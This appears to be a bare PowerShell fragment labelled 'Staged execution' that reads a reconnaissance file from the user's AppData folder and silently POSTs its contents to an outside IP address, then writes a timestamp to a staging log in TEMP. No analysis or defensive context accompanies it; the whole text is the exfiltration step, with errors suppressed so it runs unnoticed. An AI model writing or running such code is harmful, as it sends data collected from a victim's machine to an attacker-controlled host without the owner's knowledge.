
<# Staged execution #> $BodyText = Get-Content -Path "$env:APPDATA\recon.json" -Raw -ErrorAction SilentlyContinue; Invoke-RestMethod -Uri "https://203.0.113.221/upload" -Method Post -Body $BodyText -ContentType "application/json" -ErrorAction SilentlyContinue; Get-Date -Format "yyyy-MM-dd HH:mm:ss" | Out-File -FilePath "$env:TEMP\stage.log" -Append
